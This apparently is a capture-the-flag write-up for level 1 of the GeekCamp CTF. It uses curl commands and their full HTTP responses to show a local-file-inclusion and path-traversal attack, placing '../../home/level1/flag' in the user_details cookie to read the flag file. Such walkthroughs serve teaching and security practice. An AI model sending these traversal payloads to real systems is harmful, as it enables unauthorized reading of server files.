# Level 1

Making a request on the page returns some HTML, and the page sets a `user_details` cookie.
The contents look like a filename.

```shell
> curl -v http://ctf.geekcamp.sg
```

```
> GET / HTTP/1.1
> User-Agent: curl/7.38.0
> Host: ctf.geekcamp.sg
> Accept: */*
> 
< HTTP/1.1 200 OK
* Server nginx/1.6.2 is not blacklisted
< Server: nginx/1.6.2
< Date: Tue, 21 Oct 2014 09:41:46 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.6.2
< Set-Cookie: user_details=user_pfhaltq9fpjve69zav.dat
< 

[snipped]

<small> This is level1, and you are a new user! </small>
```

---

If we try a local file inclusion exploit, the output does disappear, lending some credence to the theory.

```shell
> curl -b 'user_details=/home/level1/flag' -v http://ctf.geekcamp.sg
```

```
> GET / HTTP/1.1
> User-Agent: curl/7.38.0
> Host: ctf.geekcamp.sg
> Accept: */*
> Cookie: user_details=/home/level1/flag
> 
< HTTP/1.1 200 OK
* Server nginx/1.6.2 is not blacklisted
< Server: nginx/1.6.2
< Date: Tue, 21 Oct 2014 09:44:51 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.6.2
< 

[snipped]

<small> This is level1, and you are  </small>
```

---

At this point, if you keep traversing up the hierarchy, you'll eventually see this:

```shell
> curl -b 'user_details=../../home/level1/flag' -v http://ctf.geekcamp.sg
```

```
> GET / HTTP/1.1
> User-Agent: curl/7.38.0
> Host: ctf.geekcamp.sg
> Accept: */*
> Cookie: user_details=../../home/level1/flag
> 
< HTTP/1.1 200 OK
* Server nginx/1.6.2 is not blacklisted
< Server: nginx/1.6.2
< Date: Tue, 21 Oct 2014 09:48:17 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.6.2
< 

[snipped]

<small> This is level1, and you are iesieshahgheojaviguzaehusahbosheiyoochil
```

\#win
